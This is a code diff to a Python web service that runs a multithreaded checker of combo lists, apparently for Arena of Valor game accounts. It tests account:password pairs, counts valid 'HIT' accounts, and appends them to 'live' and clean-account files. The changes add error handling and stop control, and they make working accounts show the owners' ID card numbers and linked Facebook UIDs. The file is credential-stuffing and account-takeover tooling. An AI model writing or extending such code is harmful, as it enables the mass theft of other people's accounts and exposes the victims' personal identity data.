@@ -107,12 +107,21 @@ def enrich_account_result(r: dict) -> dict:
     else:
         r["email_str"] = f"NO [{masked_email} - CHƯA XÁC THỰC]"
 
-    r["cmnd_str"] = "YES" if sec_data.get("has_cccd") else "NO"
-    r["authen_str"] = "YES" if sec_data.get("auth_2fa") else "NO"
-    r["fb_str"] = "YES" if sec_data.get("fb_linked") else "DIE"
+    idcard = (sec_data.get("idcard") or "").strip()
+    if sec_data.get("has_cccd"):
+        r["cmnd_str"] = f"YES [{idcard}]" if idcard and idcard.replace("*", "").strip() else "YES"
+    else:
+        r["cmnd_str"] = "NO"
 
-    if r.get("status") == "HIT":
-        r["full_line"] = format_account_full_info(r)
+    r["authen_str"] = "YES" if sec_data.get("auth_2fa") else "NO"
+
+    fb_uid = (sec_data.get("fb_uid") or "").strip()
+    if sec_data.get("fb_linked"):
+        r["fb_str"] = f"YES [{fb_uid}]" if fb_uid else "YES"
+    else:
+        r["fb_str"] = "DIE"
+
+    r["full_line"] = r.get("full_info") or format_account_full_info(r)
     return r
 
 
@@ -252,20 +261,30 @@ class AOVWebHandler(BaseHTTPRequestHandler):
                     return
                 all_res = task["results"]
                 new_slice = all_res[offset:] if offset < len(all_res) else []
+                is_running = bool(task.get("is_running", False))
+                should_stop = bool(task.get("should_stop", False))
+                total = int(task.get("total", 0) or 0)
+                done = int(task.get("done", 0) or 0)
+
+                # is_done is True only if explicitly stopped, or all items finished, or worker thread completed
+                is_done = should_stop or (done >= total and total > 0) or (not is_running)
+                status_text = "STOPPED" if should_stop else ("DONE" if is_done else "RUNNING")
+
                 resp_data = {
                     "task_id": task_id,
-                    "total": task["total"],
-                    "done": task["done"],
-                    "progress": task["done"],
-                    "hits": task["hits"],
-                    "trang": task["trang"],
-                    "invalid": task["invalid"],
-                    "is_running": task["is_running"],
-                    "is_done": not task["is_running"],
-                    "status": "DONE" if not task["is_running"] else "RUNNING",
+                    "total": total,
+                    "done": done,
+                    "progress": done,
+                    "hits": task.get("hits", 0),
+                    "trang": task.get("trang", 0),
+                    "invalid": task.get("invalid", 0),
+                    "is_running": is_running and not should_stop,
+                    "is_done": is_done,
+                    "was_stopped": should_stop,
+                    "status": status_text,
                     "results": all_res,
                     "new_results": new_slice,
-                    "all_hits_count": len(task["all_hits"]),
+                    "all_hits_count": len(task.get("all_hits", [])),
                     "next_offset": len(all_res),
                 }
             self._send_json(resp_data)
@@ -688,31 +707,60 @@ class AOVWebHandler(BaseHTTPRequestHandler):
                     if task_state.get("should_stop"):
                         return
                     a, p = pair
-                    r = enrich_account_result(check_account(a, p))
+                    try:
+                        r = enrich_account_result(check_account(a, p))
+                    except Exception as err:
+                        r = {
+                            "account": a,
+                            "password": p,
+                            "status": "ERROR",
+                            "message": f"Lỗi xử lý: {str(err)}",
+                            "is_trang": False,
+                            "is_vip": False,
+                            "hero_count": 0,
+                            "skin_count": 0,
+                            "rank": "Chưa Đấu Hạng",
+                            "sdt_str": "NO",
+                            "email_str": "NO",
+                            "cmnd_str": "NO",
+                            "authen_str": "NO",
+                            "fb_str": "DIE",
+                            "full_line": f"{a}:{p} | STATUS : ERROR | DETAIL : {str(err)}"
+                        }
+
                     with _TASKS_LOCK:
                         if task_state.get("should_stop"):
                             return
                         task_state["done"] += 1
                         task_state["results"].append(r)
                         done_str = f"[{task_state['done']}/{task_state['total']}]"
-                        if r["status"] == "HIT":
+                        if r.get("status") == "HIT":
                             task_state["hits"] += 1
                             task_state["all_hits"].append(r)
-                            full_line = format_account_full_info(r)
+                            full_line = r.get("full_line") or format_account_full_info(r)
                             if r.get("is_trang"):
                                 task_state["trang"] += 1
-                                with open(trang_path, "a", encoding="utf-8") as ft:
-                                    ft.write(full_line + "\n")
-                            with open(live_path, "a", encoding="utf-8") as fh:
-                                fh.write(full_line + "\n")
+                                try:
+                                    with open(trang_path, "a", encoding="utf-8") as ft:
+                                        ft.write(full_line + "\n")
+                                except Exception:
+                                    pass
+                            try:
+                                with open(live_path, "a", encoding="utf-8") as fh:
+                                    fh.write(full_line + "\n")
+                            except Exception:
+                                pass
                             print(f"{done_str} {full_line}", flush=True)
                         else:
-                            if r["status"] == "INVALID":
+                            if r.get("status") == "INVALID":
                                 task_state["invalid"] += 1
                             print(f"{done_str} {a}:{p} | STATUS : {r.get('status')} | DETAIL : {r.get('message', 'FAIL')}", flush=True)
 
                     if uid:
-                        save_check_history(int(uid), f"{a}:{p}", r.get("status", "FAIL"), r)
+                        try:
+                            save_check_history(int(uid), f"{a}:{p}", r.get("status", "FAIL"), r)
+                        except Exception:
+                            pass
 
                 with ThreadPoolExecutor(max_workers=threads) as executor:
                     for combo in combos:
@@ -848,33 +896,69 @@ class AOVWebHandler(BaseHTTPRequestHandler):
                 print(f"\n[BẮT ĐẦU FILE BATCH {task_id}] File: {upload_id}.tmp | Tổng: {len(combos)} tài khoản | Luồng: {threads}", flush=True)
 
                 def check_worker(pair):
+                    if task_state.get("should_stop"):
+                        return
                     a, p = pair
-                    r = enrich_account_result(check_account(a, p))
+                    try:
+                        r = enrich_account_result(check_account(a, p))
+                    except Exception as err:
+                        r = {
+                            "account": a,
+                            "password": p,
+                            "status": "ERROR",
+                            "message": f"Lỗi xử lý: {str(err)}",
+                            "is_trang": False,
+                            "is_vip": False,
+                            "hero_count": 0,
+                            "skin_count": 0,
+                            "rank": "Chưa Đấu Hạng",
+                            "sdt_str": "NO",
+                            "email_str": "NO",
+                            "cmnd_str": "NO",
+                            "authen_str": "NO",
+                            "fb_str": "DIE",
+                            "full_line": f"{a}:{p} | STATUS : ERROR | DETAIL : {str(err)}"
+                        }
+
                     with _TASKS_LOCK:
+                        if task_state.get("should_stop"):
+                            return
                         task_state["done"] += 1
                         task_state["results"].append(r)
                         done_str = f"[{task_state['done']}/{task_state['total']}]"
-                        if r["status"] == "HIT":
+                        if r.get("status") == "HIT":
                             task_state["hits"] += 1
                             task_state["all_hits"].append(r)
-                            full_line = format_account_full_info(r)
+                            full_line = r.get("full_line") or format_account_full_info(r)
                             if r.get("is_trang"):
                                 task_state["trang"] += 1
-                                with open(trang_path, "a", encoding="utf-8") as ft:
-                                    ft.write(full_line + "\n")
-                            with open(live_path, "a", encoding="utf-8") as fh:
-                                fh.write(full_line + "\n")
+                                try:
+                                    with open(trang_path, "a", encoding="utf-8") as ft:
+                                        ft.write(full_line + "\n")
+                                except Exception:
+                                    pass
+                            try:
+                                with open(live_path, "a", encoding="utf-8") as fh:
+                                    fh.write(full_line + "\n")
+                            except Exception:
+                                pass
                             print(f"{done_str} {full_line}", flush=True)
                         else:
-                            if r["status"] == "INVALID":
+                            if r.get("status") == "INVALID":
                                 task_state["invalid"] += 1
                             print(f"{done_str} {a}:{p} | STATUS : {r.get('status')} | DETAIL : {r.get('message', 'FAIL')}", flush=True)
 
                     if uid:
-                        save_check_history(int(uid), f"{a}:{p}", r.get("status", "FAIL"), r)
+                        try:
+                            save_check_history(int(uid), f"{a}:{p}", r.get("status", "FAIL"), r)
+                        except Exception:
+                            pass
 
                 with ThreadPoolExecutor(max_workers=threads) as executor:
-                    executor.map(check_worker, combos)
+                    for combo in combos:
+                        if task_state.get("should_stop"):
+                            break
+                        executor.submit(check_worker, combo)
 
                 with _TASKS_LOCK:
                     task_state["is_running"] = False
